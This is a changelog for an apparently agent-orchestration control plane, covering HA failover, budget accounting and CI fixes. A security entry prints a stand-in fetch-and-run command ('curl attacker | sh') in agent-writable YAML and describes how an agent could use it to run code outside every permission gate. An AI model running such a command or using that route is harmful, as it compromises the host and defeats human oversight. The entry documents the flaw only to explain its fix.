# Changelog

## [Unreleased]

### Added

- **A lost attempt can be retried automatically, on a different node.** A node
  that disappears mid-run is the one failure the control plane has no evidence
  about: the attempt ends `lost`, no completion report ever arrives, and
  nothing is known about what the agent already did. That used to be terminal
  (`failed` / `node_lost`) even with `max_attempts` budget left, because the
  auto-retry for reported failures lives in `complete_attempt` — which a dead
  node never calls. The two paths now agree: `lose_node_attempts` spends the
  same `max_attempts` budget, puts the task back in `queued`, and writes an
  audit row (`task.retry.auto_node_lost`) naming the node and the lost attempt.

  The retry is steered onto a **different** node. `avoid_node_id` is set when
  an attempt is lost and cleared when the next attempt is assigned, and the
  scheduler skips that node — otherwise "retry" would mean the same node
  getting another go at the work that just killed it. Avoidance is a
  preference, not a lock: when the avoided node is the only one online the skip
  is lifted, because retrying there beats parking the task in `queued` forever.
  `GET /v1/tasks/{id}/eligibility` reports the skipped node with that reason, so
  a task held back by avoidance does not read like a scheduler bug.

  Repeating side effects is a product decision, not a technical one — the lost
  attempt may already have pushed a branch or called out to the world — so it
  is per task: `retry_on_node_loss` (default `true`) and
  `--no-retry-on-node-loss` on the CLI. A default task (`max_attempts = 1`) is
  unaffected either way: there is no budget to spend.
- **ACP `usage_update` now feeds both budget ceilings.** Native ACP agents
  report usage as running session totals
  (`{ used, size, cost: { amount, currency } }`), and the budget path never saw
  them: only the wrapper adapters (`claude`, `codex`) emitted `progress` events
  with per-event deltas, so a native ACP agent stayed at zero spend and zero
  tokens no matter what it cost. `map_session_update` now maps `usage_update`
  onto `EventKind::Usage` and normalizes both numbers:

  * `cost.amount` (USD) → integer `cost_cents` flagged `cost_cumulative`.
    `EventSink` converts it to a per-event delta before accumulating, because
    summing a cumulative value inflates spend quadratically (5 + 12 + 20 = 37¢
    for a 20¢ session) and trips ceilings that never fired. `saturating_sub`
    keeps an account-rotation reset from subtracting out of the running total.
  * `used` (context-window occupancy) → `tokens` flagged `tokens_gauge`. It is
    a gauge, not a counter: it rises as the conversation grows and falls when
    the agent compacts, so the node counts only positive movement. That makes
    the token total monotone — a compaction lowers the baseline instead of
    refunding budget, and the same tokens are never counted twice when the
    context refills. `max_tokens` therefore now works on the ACP path, as a
    proxy for consumption rather than an exact count.

  The node also rewrites the event it stores so `tokens`/`cost_cents` hold the
  **increment**, keeping the raw readings under `used`/`cost_cumulative_cents`.
  The control plane aggregates these events with a plain
  `SUM(json_extract(payload, '$.tokens'))`, so a running total left in place
  would be summed across updates and inflate the workflow budget — a latent
  bug for `cost_cents` as well, fixed by the same rewrite.

  Non-USD currencies are left unconverted (no FX table here; passing EUR off as
  USD would be wrong by a factor) and the original `cost` object stays in the
  payload for inspection.
- **HA chaos is a CI gate.** `.github/workflows/ha-chaos.yml` builds the
  cluster binaries and runs the process-based scenarios (`run-ha-3host.sh`,
  `run-ha-2pluswitness.sh`, `run-ha-partition.sh`, `run-ha-incremental.sh`)
  as a 4-way matrix on ubuntu-latest: on every push touching
  `crates/control-plane/src/ha/`, `crates/edge/`, `crates/node-daemon/src/`
  or `tests/e2e/run-ha-*.sh`, nightly at 04:00, and on PRs labelled
  `ha-chaos`. Per-scenario logs are uploaded even on success
  (`AG_E2E_KEEP=1`). Until now the only tests that kill a leader and assert
  "exactly one leader / no acknowledged write lost" ran by hand.
- **HA observability: metrics, dashboard row, alert rules.** `/metrics` now
  emits `agentgrid_cp_term`, `agentgrid_cp_applied_seq`,
  `agentgrid_cp_snapshot_seq`, `agentgrid_cp_snapshot_age_seconds`,
  `agentgrid_cp_has_leader`, `agentgrid_cp_leader_contact_age_seconds`,
  `agentgrid_cp_need_full_snapshot`,
  `agentgrid_cp_changeset_batches_applied_total` and
  `agentgrid_cp_changeset_apply_failures_total` (HA mode only, so single-mode
  output is unchanged). `deploy/grafana/agentgrid.json` gained an
  "HA cluster (ADR 0021)" row, and `docs/monitoring.md` documents the metrics
  plus six alert rules (leaderless, dual leaders, replication stalled,
  snapshot stale, changeset failures, edge leaderless).
- **`AGENTGRID_HA_CHANGESET_RETENTION`** (default 256, `0` disables): the
  leader now prunes object-storage changeset batches that its newest snapshot
  already contains. See "Fixed" below for why the bucket could not stay
  bounded before.
- **Edge forwarder unit tests.** `crates/edge` had 423 lines and zero tests;
  it now covers leader discovery across upstreams, leaderless `503` +
  `Retry-After`, the single-retry budget after `503 not_leader`, hop-by-hop
  header stripping, the `/metrics` counters, and — against an upstream that
  accepts the connection and never answers — a bounded timeout that fails
  over instead of hanging.

- **Control-plane HA phase 6: stable endpoint, deploy, ADR, chaos.** Stateless
  edge forwarder `crates/edge` (binary `agentgrid-cp-edge`) discovers the
  leader via `GET /v1/ha/status`, forwards HTTP/SSE/downloads unchanged,
  retries once after `503 not_leader` or connect error, bridges the node
  WebSocket, answers `503` + `Retry-After` when leaderless, and exposes
  Prometheus text metrics at `/metrics`. Dockerfile `Dockerfile.edge` +
  release workflow build/size/smoke/checksum/upload entries. Compose files
  `deploy/compose/ha-3data.yml` (3 data hosts + edge) and
  `ha-2pluswitness.yml` (2 data + witness + edge), plaintext dev variants;
  `deploy/install-control-plane.sh` gained HA flags
  (`--ha-role/--ha-node-id/--ha-cluster-id/--ha-cluster-token/--ha-peers/
  --ha-witnesses/--ha-advertise-url/--ha-rpo-mode/--ha-snapshot-interval/
  --ha-allow-plaintext`). Chaos e2e:
  `tests/e2e/run-ha-3host.sh`, `run-ha-2pluswitness.sh`,
  `run-ha-partition.sh` (kill/SIGSTOP leader, assert exactly one leader, edge
  forwarding, post-failover task, no dual writers). Docs: ADR 0021
  (`docs/decisions/0021-control-plane-high-availability.md`, supersedes ADR
  0001 constraint #9 and ADR 0008 deferral, keeps no-active-active and no-NFS),
  `docs/ha-runbook.md`, `docs/ha-deployment.md`, threat-model additions
  (T28–T34), monitoring via existing `/metrics` + Grafana dashboard.** Optional `AGENTGRID_HA_MODE=ha` runs the
  control plane as an active-passive cluster (`data` leaders/standbys plus
  token-only `witness` voters) with term/epoch election, quorum leases that
  fence stale leaders, `VACUUM INTO` snapshot replication verified by SHA-256
  and `quick_check`, and a standby that answers only `/health/*` and
  `/v1/ha/*` until promoted. Single mode is byte-for-byte the old path.
  Operator surface: `ag cluster status|promote|demote|snapshot`; e2e:
  `tests/e2e/run-ha-manual.sh`.
- **Control-plane HA phase 3: automated failover, artifact and client
  failover.** Candidates only campaign when the old leader is unreachable and
  refuse promotion when any voter is ahead; catch-up is bounded by
  `AGENTGRID_HA_APPLY_TIMEOUT_SECS`. Artifact bytes replicate separately from
  snapshots: the leader eagerly pushes the stored file (SHA-256 of the bytes
  on disk, `.zst` aware) to peers, and a promoted leader pulls + verifies a
  missing blob on read (`artifacts.stored_sha256`, migration 0094).
  `node-daemon` accepts `AGENTGRID_SERVERS` (ordered CP URLs), follows the
  `x-agentgrid-leader` hint on 503, reconnects immediately on WS close `4004`,
  and retries enrollment across replicas; the CLI probes `AGENTGRID_SERVERS`
  at startup; TS/Python SDKs take an ordered URL list. e2e:
  `tests/e2e/run-ha-failover.sh` (`kill -9` leader, measured RTO ~2s, in-flight
  task survives, artifact pulled from a peer, node follows, rejoin as
  standby, graceful demote closes WS `4004`).
- **Control-plane HA phase 4: incremental changeset replication.**
  `AGENTGRID_HA_RPO_MODE=async|sync` (build feature `ha-incremental`) records
  every write transaction with the SQLite session extension and ships
  changesets to the data replicas instead of waiting for snapshots. `async`
  coalesces commits into ≤1s batches and demotes the leader when no data
  replica acknowledges within `AGENTGRID_HA_ASYNC_MAX_LAG_MS`; `sync` holds
  the write gate across a data-quorum ack, so an acknowledged write survives
  leader loss (RPO=0). Standbys apply batches atomically with
  `synchronous=FULL`, reject gaps/schema mismatches/conflicts (leader falls
  back to a snapshot), and a demoted leader refuses increments until a forced
  snapshot restores it. The session extension is compiled in via
  `.cargo/config.toml` (no bindgen/libclang); writes that bypassed the fence
  now go through `Store::write_one`. e2e:
  `tests/e2e/run-ha-incremental.sh` (async/sync, no snapshots cut, `kill -9`
  leader keeps the acknowledged task).


### Changed

- **A demoted leader undoes its own un-replicated writes instead of restoring a
  snapshot.** The old rule was "it may hold writes nobody else saw, so condemn
  the database and restore the new leader's snapshot". That is correct but
  expensive: the replica downloads the whole database (seconds here, minutes at
  production sizes) and, because `need_full_snapshot` also blocks campaigning,
  stays unelectable until it lands. In `async`/`sync` modes the divergent suffix
  is exactly what the leader shipped but no data quorum acknowledged, and the
  replicator still holds those changesets — so a demotion now inverts them
  (`sqlite3changeset_invert`) and replays the undo newest-first in one
  transaction. When it commits, `repl_seq` is back at the acknowledged
  watermark, the rows are what they were before the leadership admitted them,
  and the node is immediately a valid replica *and* electable. Anything that
  makes the undo doubtful — an evicted changeset, a gap, a conflicting apply, a
  position that moved under it, or the time budget — falls back to the old
  snapshot path, which is unchanged. No tuning knob is needed: the buffer only
  holds the un-acknowledged tail (one changeset in `sync`, one async batch
  window in `async`) and is capped at 512 entries / 8 MiB regardless.
- **A condemned replica can rebuild itself when no leader is left.** If the only
  data node demoted, or every other replica is gone, there is no snapshot source
  *and* `need_full_snapshot` keeps the survivor out of every election — the
  cluster sat dead until an operator intervened. The snapshot a replica was last
  built from is now kept as `ha-base.db` and, after 30 s with no leader,
  restored in place. The node comes back as a valid replica at that sequence; if
  that leaves it behind, the data voters refuse it a vote, which is their call
  to make, not a reason to stay unelectable forever.

### Fixed

- **A per-task token ceiling no longer reports success when the breach lands
  after the run.** The ceiling was enforced only by a 1 s poll racing the
  child, so it could fire only if the adapter reported usage *during* the run.
  A short single-step run reports its usage as it exits — opencode emits one
  `step_finish` — so `tokens_total` was still 0 when the poll window closed,
  the run exited 0, and the task was recorded `succeeded` with 7 830 tokens
  spent against a declared `max_tokens` of 300. Both supervisors now re-check
  the ceiling after the adapter's streams are drained (the point where the last
  usage report has been accounted) and report `budget_exceeded`, which the
  control plane already treats as a failure even at exit 0. The attempt loop
  also stops on a budget kill instead of running a validation round — and its
  feedback retry — against a ceiling already declared breached. Verified on the
  two-host stand against real `opencode` 2.2.1 and 1.19.5: the same task that
  reported `succeeded` now reports `failed` / `budget_exceeded`.
- **Failover recovery went from ~133 s to ~50 s.** Three separate waits stacked
  up in `run-ha-partition.sh` after the leader was frozen, and only the first
  was visible in the logs:
  - **The node's HTTP heartbeat inherited the long-poll's 120 s timeout.** The
    beat that fired 1 s after the freeze only failed at `t+121 s`; because
    `node_ineligibility` requires `status = online` and only a heartbeat (or a
    poll) refreshes that column, the node could not be scheduled until then.
    Beats are now bounded at 15 s and rotate on expiry like any other connect
    error.
  - **`WS_READ_IDLE_SECS` was 90 s** — six missed pings, because it was derived
    from the node's own 30 s beat instead of the control plane's 15 s `PING`
    cadence. Now 45 s (three missed pings), and the WS handshake bound dropped
    15 s → 10 s.
  - **A connected node stayed invisible to the scheduler.** See the entry
    below on the WS `hello`.
- **A node with a live WS connection was not schedulable until a heartbeat
  reached the current leader.** `node_ineligibility` requires
  `status = online`, and that column was refreshed only by `heartbeat` — or by
  `register_or_touch_node` on the *poll* path. The WS path registered the
  socket in memory and nothing else, so after a failover a node that had
  already connected to the new leader stayed ineligible: in
  `run-ha-partition.sh` the WS was up at `t+46 s` and the first attempt only
  started at `t+89 s`, immediately after a heartbeat finally landed. The
  `hello` handler now performs the same registration the poll transport does,
  using the capabilities the hello already carries.
- **Elections now finish in one round instead of two.** The voter side of
  `handle_vote` persisted the candidate's term and demoted the local leader
  *before* deciding whether to grant, so a node that could not win still
  toppled the incumbent. In `run-ha-partition.sh` cp-a won term 2, cp-c's
  term-3 bid landed 177 ms later and demoted it, cp-c was then refused for
  being behind (seq 2 vs 3) and had to win term 4 — an extra term, an extra
  snapshot restore on cp-a and ~3.3 s with no leader. `VoteRequest` gained
  `pre_vote`: a probe that asks "would you vote for me at this term?" and
  persists nothing, records no vote and demotes nobody. It is refused while a
  leader was heard from within one election timeout (leader stickiness), so the
  survivor whose timer fired a few hundred ms late stays quiet; stickiness
  expires on its own when the leader really dies. A real round — which does bump
  the term — only starts after a pre-vote quorum agrees. `campaign` now shares
  one `solicit` fan-out for both rounds. Four unit tests cover it. Note: HA is
  still unreleased, and the probe is only safe once every replica runs this
  version (an older peer would treat a probe as a real vote).
- **A node discarded the leader hint it had just followed, so WS failover never
  landed.** On `503 not_leader` the daemon called `Endpoints::follow_hint`,
  which moves `current` onto the leader — and then the reconnect loop called
  `advance()` unconditionally, stepping straight back off it onto the next
  standby. The hint that exists to shorten failover was therefore thrown away
  every time, and the node kept retrying standbys (plus the frozen old leader's
  handshake timeout) until the *poll fallback* happened to land on the new
  leader minutes later. In `run-ha-partition.sh` the new leader had been up
  since `t+7s` while the node did not reconnect until `t+134s`:
  `following leader hint to 127.0.0.1:17922` immediately followed by
  `rotating control-plane endpoint to 127.0.0.1:17923` (a standby).
  `connect_once` now reports whether it followed a hint, and
  `next_after_failure` refuses to rotate in that case — the guard `heartbeat`
  and `poll` already had. Three unit tests pin the behaviour.
- **`wait_leader` in the HA chaos scripts could report success with no leader
  named.** `count_leaders` and `leader_id` were two separate sweeps, so during
  a failover the first could see the old leader and the second see nobody; the
  helper returned 0 with an empty id and every later assertion compared against
  `""`. That is how `run-ha-partition.sh` failed as
  `FAIL: leader after heal= expected` — with nothing after the `=`, although
  cp-b was in fact the only leader. All three scenarios now use a single-pass
  `scan_leaders` that yields the count and the id atomically, and assert a
  non-empty id explicitly.
- **`run-ha-partition.sh` raced its own recovery budget.** The task used to land
  at ~188 s against a 180 s budget, i.e. on the last iteration, because the
  node's detection chain was that long. Recovery is ~50 s now, and the budget
  is 300 s so a slow runner cannot turn the assertion into a coin flip.
- **`cargo clippy --all-targets` failed off unix.** `TEST_ENV_LOCK` in
  `node-daemon` was `#[cfg(test)]` while every user of it is `#[cfg(unix)]`,
  so it read as dead code on Windows. Gated `#[cfg(all(test, unix))]`.
- **`run-ha-partition.sh` never started a worker.** It declared `NODE_BIN`,
  checked that the binary existed, and then asserted "a task completes during
  the partition" with no node-daemon running — the task could only ever stay
  queued. It now mints an enrollment token, starts a node through the edge and
  waits for it to report online, like the other two scenarios.
- **The edge's WebSocket bridge had the same unbounded wait as HTTP.** A frozen
  leader accepts the TCP connection and never answers the upgrade, so
  `connect_async` parked the node's reconnect attempt forever: the node never
  re-registered and no task was ever assigned (`run-ha-partition.sh`: task
  created, then "did not succeed"). The upgrade is now bounded by the same
  `AGENTGRID_EDGE_UPSTREAM_TIMEOUT_SECS`, and a failed bridge drops the cached
  leader so the retry rediscovers instead of re-hanging.
- **A leader that lost a same-term race was muted forever, and the cluster
  could end up with no electable candidate.** `demote()` unconditionally set
  `need_full_snapshot` (and zeroed `applied_seq`) on the theory that a demoted
  leader may have committed writes nobody else saw. A node that wins an
  election and is demoted 400 ms later by the same-term winner's heartbeat has
  served nothing, yet it became permanently ineligible to campaign. In
  `run-ha-partition.sh` that left cp-a muted while cp-c refused to campaign
  because its cached "leader" (cp-a) still *answered* — 11 minutes of
  `not campaigning: local database awaits a full snapshot` and
  `leader cp-a reachable but catch-up failed: cp-a is not a leader`.
  - `HaGate` now counts writes admitted since the last promotion
    (`admitted_writes`, reset in `promote`), and `demote` only condemns the
    local copy when that count is non-zero.
  - The pre-election reachability probe now blocks only when the cached leader
    still reports `role=leader`. A peer that answers `standby` is a stale hint,
    not a reason to skip an election.
- **A frozen peer made leadership flap, not just elections slow.** The lease
  loop sent heartbeats **sequentially** with a `max(election_timeout*3, 2s)`
  transport timeout, on a tick of `election_timeout/3` (200 ms in the chaos
  config). One unreachable peer therefore delayed every *later* heartbeat by a
  full timeout, so a healthy follower saw no heartbeat for ~2s against a 600 ms
  election timeout: it campaigned, terms churned, and the edge answered `503`
  in the gaps (observed as two hosts both logging `promoted to HA leader` 3s
  apart, and as 20 consecutive `503`s during `run-ha-partition.sh`).
  Heartbeats now fan out concurrently and collection stops at the next tick, so
  a dead peer costs nothing and every live peer is reached immediately.
  Witnesses are in the same fan-out (they count toward the quorum but never
  toward `data_acks`).
- **Failover after a frozen host took minutes, not seconds.** `run-ha-partition.sh`
  SIGSTOPs the leader, and the two survivors then needed ~9 minutes and 79
  election terms to settle on a leader. Votes were collected **sequentially**
  (`for peer in peers { vote(...).await }`), so each round blocked for the full
  transport timeout on the frozen peer — and because both candidates blocked
  for the same fixed duration, they stayed in lockstep, bumped the term
  together and kept refusing each other. Round time was ~7s (2s catch-up + 2s
  reachability probe + 2s vote + jitter), which drowned the 0–600ms
  randomisation that is supposed to break exactly this symmetry.
  Votes now go out concurrently and collection stops as soon as the quorum is
  met, so an unreachable voter costs nothing; the reachability probe after a
  failed pre-election catch-up is bounded by one election timeout instead of a
  full transport timeout. Freshness guarantees are unchanged: data voters still
  refuse a lagging candidate and `max_seq` still blocks promotion.
- **The edge could hang forever on a leader that stopped answering.** The
  proxy bounded only the TCP connect (`connect_timeout(5s)`); a leader that
  accepted the connection and then went silent — `SIGSTOP`, partition, a
  wedged process — pinned the client request indefinitely instead of failing
  over, so the "stable endpoint" was stable in the worst possible way. The
  wait for the response *head* is now bounded by
  `AGENTGRID_EDGE_UPSTREAM_TIMEOUT_SECS` (default 10s) and takes the existing
  retry path; SSE and artifact downloads are unaffected because `send()`
  resolves at the headers and the body keeps streaming. New
  `agentgrid_edge_upstream_timeouts_total`. Found by the new chaos gate, which
  hung for 25 minutes instead of failing.
- **The HA chaos scripts had never actually run.** They submitted tasks as
  `{"goal": ...}`, but `CreateTaskRequest` requires `prompt` and a
  non-nullable `repository`, so every scenario died on a `422` at the first
  `POST /v1/tasks` (`3host`, `2pluswitness`, `partition`). Payloads now match
  the schema through a `create_task` helper that also honours the documented
  `503 + Retry-After` contract instead of treating a leaderless instant as a
  failure. Every `curl` in those scripts carries `--max-time` — an unbounded
  `curl` against a `SIGSTOP`ped process is what turned one assertion failure
  into a hung job.
- **The 3-host and 2+witness scenarios killed the leader before any standby
  had data.** With `AGENTGRID_HA_SNAPSHOT_INTERVAL_SECS=10` and a scenario that
  bootstraps and fails over inside that window, no replica had ever applied a
  snapshot, so the new leader came up with an empty database. The failure
  surfaced as a bare `503` (no body, no `x-agentgrid-role`, no `Retry-After`)
  on every `/v1/` route — that is `require_user_auth`'s bootstrap guard
  (`user_count() == 0`), not the edge. The scenarios now wait (up to 45s, one
  snapshot interval plus the standby's 2s apply tick) until every standby
  reports `applied_seq >= 1` before killing the leader, so they test failover
  to a caught-up replica instead of racing the snapshot timer.
- **The 3-host and 2+witness scenarios asserted durability they cannot
  have.** Both required the pre-kill task to be visible on the new leader, but
  they run in the default `snapshot` RPO mode, where a standby only ever pulls
  snapshots from a *live* leader — a write acked just before the kill is
  allowed to be missing. They now probe that the edge reached *a* leader
  (200 = survived, 404 = outside the RPO window, anything else = real
  failure); durability is asserted by `run-ha-incremental.sh`, which runs with
  sync replication.
- **`Supply chain` was red on every HA push — gitleaks fixtures.** The
  allowlist entries are commit-scoped fingerprints, so each new commit that
  touched a fixture line (`tests/e2e/run-ha-2pluswitness.sh:22`, the
  `cluster_token` literals in `crates/control-plane/src/ha/tests.rs`) tripped
  the scanner again: three consecutive pushes failed on the same
  `generic-api-key` finding. The fixtures now carry inline
  `# gitleaks:allow` comments (and the three duplicated `cluster_token`
  literals collapse into one `TEST_CLUSTER_TOKEN` const), which survives
  edits. `.gitleaksignore` documents the rule and keeps the fingerprints for
  commits already in history.
- **A standby's S3 changeset poll grew with the cluster's write history.**
  `apply_s3_pending` listed the whole `changesets/` prefix every 2 s and then
  skipped what it had already applied: at one batch per second that is tens of
  thousands of keys per day, re-listed 43 000 times a day. The LIST now uses
  `start-after` at the locally applied sequence, and the leader prunes batches
  covered by its newest snapshot (`AGENTGRID_HA_CHANGESET_RETENTION`), so both
  the bucket and the poll stay bounded.
- **The control plane could not be type-checked off unix.** `store/ha.rs` used
  `std::os::unix::ffi::OsStrExt` to build the SQLite C string, so
  `cargo check -p agentgrid-control-plane` failed on Windows/macOS dev hosts
  (`could not find unix in os`). It now uses `OsStr::as_encoded_bytes`, which
  is portable; found while running the HA test suite on the Windows host.
- **Lost assignment wake-ups in the CP.** `notify_waiters` stores no permit,
  and a `Notified` future is only registered once polled: a notify landing
  while `pump_once` (WS) or the poll assign (long-poll) was awaiting DB work
  was dropped, so the node waited for the 1 s pump tick / rest of the poll
  timeout. Both waiters now call `Notified::enable()` right after pinning.
  Surfaced as a flaky >200 ms push in `ws_assignment_pushed_under_200ms`.
- **WS load harness nodes never heartbeated**, so the CP's 30 s offline
  sweep declared all 100 nodes dead mid-run and failed their in-flight
  attempts (`node_lost`): the remote 100/1000 run froze at 852/1000 while a
  ~42 s local run escaped. The harness now sends an HTTP heartbeat every
  10 s, and prints a `LOAD-STALL` dump (task statuses, online nodes, leased
  slots) before the drain deadline. Rerun recorded in
  `docs/load-baseline-3.1.md`.
- **Two-host E2E cleanup never ran on the remote**: `pkill -f` matched the
  cleanup ssh command's own argv and killed the shell before `rm`, leaving
  the node-daemon and workdir behind.

## [0.5.3] - 2026-10-27

### Fixed

- **Nightly WS attempt tests flaked under (`RUST_TEST_THREADS=16`) stress.**
  The ACPE tests prepend their fixture dir to process-global `PATH` while a
  ws test may be spawning `adapter-mock`; when the clobbered `PATH` resolved
  the real cargo-built binary instead, it exited instantly — the ws test
  either missed the "running" window or saw <10 events. Both suites now take
  one crate-wide `TEST_ENV_LOCK` around every child-env mutation.
- **`AGENTGRID_EVENT_BUF_BYTES` / `AGENTGRID_MAX_LINE_BYTES` are captured per
  sink at construction** instead of re-read from process env per event/stream.
  A test lowering the cap could previously truncate a concurrently running
  attempt's output (and its secrets); tests now override caps via setters.

## [0.5.2] - 2026-10-27

### Fixed

- **Assemble/integrator collector could never run on the second node (the
  e2e failure-injection job's remaining red).** `apply_upstream`'s
  cross-host fallback lands a worker's `changes.patch` with
  `git apply --3way`, which implies `--index` — the landed patch sat
  STAGED but uncommitted, and the NEXT upstream's cherry-pick refuses on
  a dirty index. Whenever a remote patch preceded a local commit (the
  collector landing on the worker-2 node: fetch worker-1's SHA →
  "not our ref" → patch fallback → cherry-pick worker-2 → refused), the
  collector failed deterministically; it only ever passed when
  scheduling happened to put the local commit first. Each landed patch
  is now committed as its own commit, keeping the tree clean for the
  rest of the sequence. Found via the node-log dump added to
  run-assemble.sh (pre-existing flake, surfaced by scheduling luck).
- **An attempt that dies before it starts no longer hangs "running"
  forever.** `dispatch_batch` only logged run_attempt's early errors
  (workspace prep, mirror clone, upstream landing): the CP kept the
  attempt running until its own sweep — the same collector sat five
  minutes in "running". A failed terminal completion
  (`infrastructure_failed`) is now reported, with the durable outbox
  covering a CP outage at that moment.
- **ws read-idle actually fires now**: the first version put the
  timeout inside `select!`, where every 30 s heartbeat tick rebuilt the
  future and reset the 90 s deadline — a no-op. Now the last inbound
  frame timestamp is tracked and checked per loop iteration.
- **Nightly CI gates were dead on arrival — three separate causes.**
  Every scheduled run since the gates landed (~Oct 15) was red:
  - `tier1 clean host` died at its first line with exit 2: the
    debian:12-slim container ran `sh` (dash), which rejects
    `set -o pipefail` — and `run-clean-host.sh` needs bash anyway.
    The step now bootstraps bash and execs the script with it.
  - the main `fmt / clippy / test / build` job (and, on any PR,
    `pr-validation`'s fmt/clippy jobs and `coverage`'s llvm-tools)
    would die with "cargo-fmt is not installed": rust-toolchain.toml
    pins the toolchain with profile=minimal, rustup auto-installs it
    without extra components, and the dtolnay action's `components:`
    input targets its default toolchain instead of the pin. Those
    steps now `rustup component add` against the exact pinned version
    (parsed from rust-toolchain.toml). This is what broke CI #868 on
    the previous push.
  - `cargo deny` / `cargo audit` flagged 9 fresh RustSEC advisories
    against the lockfile: rustls 0.23.45 (4), rustls-webpki 0.103.15,
    webpki-roots 1.0.8, tokio 1.52.4, ctutils 0.4.2 — all patched by
    `cargo update` (rustls 0.23.46, webpki 0.103.16, webpki-roots
    1.0.11, tokio 1.54.1, ctutils 0.4.5; MSRV 1.94 still checks clean,
    full workspace suite green). RUSTSEC-2026-0387 (crypto-bigint 0.5.5
    constant-time) has no in-tree fix — the patched 0.7.x needs
    elliptic-curve >=0.14, which jsonwebtoken 11 pins away — so it is
    a documented ignore (same HMAC-only unreachability analysis as the
    existing RUSTSEC-2023-0071 rsa entry), mirrored in deny.toml and
    supply-chain.yml.
  - the same push surfaced the nightly `race/concurrency stress` job's
    exit 101 (red since the gates landed): `drive_acp_session` aborted
    its notification-stream task the moment the `session_prompt` RPC
    resolved — but the response is parsed AFTER any trailing
    session/update lines on the same stdout, so updates still queued in
    the stream task were silently dropped on every successful session
    (the fake-agent test asserts exactly this and is unix-only, which is
    why the Windows dev host never saw it). The teardown is now
    cooperative: signal → drain everything already queued → bounded
    2 s join, with the abort demoted to a belt. Message handling moved
    into `handle_agent_message` so the drain path cannot drift from the
    live loop.

- **Security: eval-case probe no longer executes agent-writable YAML.**
  `probe_evals` used to re-read and `sh -c` every `*.yaml` under the
  attempt worktree's `.agentgrid/evals/` *after* the agent ran — but the
  worktree is agent-mutable, so any agent (even under an approval-gated
  adapter, with zero approved tool calls) could drop `evil.yaml` with
  `command: curl attacker | sh` and have the daemon itself execute it in
  its own context, outside every permission gate. The probe now runs only
  the commands captured in daemon memory at materialisation time (when the
  CP-stamped artifacts were fetched over the authenticated node API) and
  re-reads each pinned file solely to verify its SHA-256 still matches: a
  modified or deleted pinned case fails the suite (fail-closed), and
  unlisted YAML files are logged and never parsed or executed. On an
  unsandboxed node the eval child additionally gets a clean environment
  (PATH/HOME only) instead of the daemon's inherited env — parity with
  `ProcessBackend::spawn`'s long-standing hygiene; sandboxed nodes keep
  inheritance (docker/systemd CLIs may need DOCKER_HOST/DBUS). New tests
  cover tamper-fail, deleted-case-fail and unlisted-file-ignored.
- **Build/MSRV made honest: the workspace did not compile outside floating
  CI.** CI runs `stable` (whatever shipped that week), so it was green,
  but the lockfile's real floor is rustc 1.94 (sqlx 0.9) — the declared
  `rust-version = "1.85"` was fiction and any dev on an older toolchain
  got an impenetrable resolver error (exactly what happened on the Windows
  dev host: 1.86 could not even `cargo check`). Fixed by pinning
  `rust-toolchain.toml` to 1.99.1 (every machine now compiles what CI
  compiles), bumping `rust-version` to 1.94, dropping the portable job's
  explicit `toolchain: stable` override so the pin wins, and adding an
  `msrv` CI job that `cargo check`s the workspace on 1.94.0 so the claim
  can never silently rot again (verified locally: full workspace
  `--all-targets` check passes on 1.94.0).
- **Node event hot path no longer fsyncs on the async runtime.**
  `EventSink::push`/`flush`/`drain_outbox` called `EventOutbox`
  `push`/`ack`/`pending` inline — std file I/O, per-append `sync_data`
  and ack's full-file rewrite+rename executed on Tokio workers. One
  struggling disk stalled every concurrent attempt's flush, the WS control
  channel and the heartbeat (git and heartbeat scans were already
  `spawn_blocking`; the event path was the one gap). All three now run
  via `spawn_blocking` wrappers.
- **Node WS session heals half-open connections.** `run_session` selected
  on `hb.tick()` and an unbounded `sock.next()`: a NAT drop / partition
  left the session parked on a never-resolving read (and an unbounded
  heartbeat send on a full buffer) until TCP itself gave up many minutes
  later — Cancel/ConfigUpdate stalled the whole time. Reads are now
  bounded by a 90 s idle timeout (3× the heartbeat interval; the CP pings
  every ~15 s) and heartbeat writes by 15 s; the reconnect loop takes
  over from there.
- **Timeout-less HTTP clients bounded.** `notify_task`'s webhook client
  and the ACP gateway's CP client were `reqwest::Client::new()` — no
  timeout, the exact pitfall `polling.rs` documents for the daemon
  client. A black-holed webhook accumulated one parked task+connection
  per terminal task event; a hung CP POST parked the 1 s-poll
  `session_prompt` loop and permission relay forever. Now 10 s connect +
  15 s total (notify) and 10 s connect + 30 s total (ACP gateway).
- **ACP gateway session map no longer leaks.** `sessions` entries were
  only removed on `session_cancel`, so clients that opened sessions and
  vanished leaked a `SessionMeta` each for the process lifetime; they now
  carry a last-used stamp and are reaped after 24 h (same pattern as the
  existing `asked` TTL sweep).
- **Startup recovery is O(n) over the completion outbox** instead of
  O(n²): each `redeliver_completion` re-read and re-parsed the whole
  `completions.jsonl`, and startup called it per pending record. The
  send/ack logic moved into `deliver_completion`; startup makes one
  `pending()` pass, the per-id path (dispatch_batch) delegates unchanged.
- **Byte-slice panics on non-ASCII ids** (both server-provided): the
  Telegram approval formatter's `&task[..8]` and the CP notification
  `chat_text`'s `&task_id[..8]` now truncate on char boundaries.
- **Telegram gateway URL path segments percent-encoded.** `/show`,
  `/cancel`, `/logs`, `/allow`, `/deny` ids and conversation ids were
  `format!`-ed into URLs raw — WHATWG normalization could turn a crafted
  `../`-shaped id into an endpoint retarget under the gateway's admin
  JWT. Only allowlisted chats reach these commands, but the ids are now
  encoded regardless.
- **Raw output mirror errors are no longer silent.** A disk-full on the
  worktree's `agent-raw-output.log` mirror silently truncated the agent's
  raw tail with no log line; the write now warns (the CP-visible event
  stream was never affected).
- **Two startup/teardown panics made honest:** the completion-outbox
  double-fallback ends in an `expect` naming the real condition (neither
  data dir nor temp dir writable) instead of a bare `unwrap`; the CP test
  `AppState` Drop uses `to_string_lossy` so a non-UTF-8 temp path cannot
  panic during teardown.

- **Local-source validation cannot be fooled by a repo above the path.**
  `validate_local_source` ran `git rev-parse --git-dir` with plain parent
  discovery, so on any machine with a `.git` higher up the tree (a dotfiles
  repo in `$HOME`, say) a plain non-repo directory passed "is a git
  repository" and failed much later inside `clone --mirror` with a baffling
  branch error. Both rev-parse and show-ref now set
  `GIT_CEILING_DIRECTORIES` to the validated path's parent, pinning
  discovery to the path itself. Found because the Windows dev host (HOME
  is a repo) failed `local_path_validates_repo_and_branch` — the same
  environment-sensitivity made `probe_cluster_adapter_reports_missing`
  assert on `version.is_none()`, which legitimately holds only where
  `sh --version` is quiet (dash); that assert is dropped, the deterministic
  missing-executor one stays.
- **Clippy 1.99 clean:** `manual_is_multiple_of` in the CP maintenance
  loop (`tick % 4` → `tick.is_multiple_of(4)`) — first surfaced by the
